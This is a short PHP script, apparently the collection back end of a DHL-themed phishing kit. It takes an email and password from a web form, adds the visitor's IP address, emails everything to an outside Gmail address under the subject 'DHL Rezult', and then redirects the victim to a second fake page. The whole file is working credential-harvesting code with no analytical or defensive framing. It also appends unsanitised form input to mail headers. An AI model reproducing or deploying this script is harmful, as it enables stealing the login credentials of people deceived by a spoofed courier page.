<?   

$ip = getenv("REMOTE_ADDR");
$message .= "Email : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "------xXx-------\n";
$message .= "IP : ".$ip."\n";
$send = "rezulltboxx@gmail.com";
$subject = "DHL Rezult";
$headers = "From: cot53<logs@mailer.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location:  dhl2.html");
	  

?>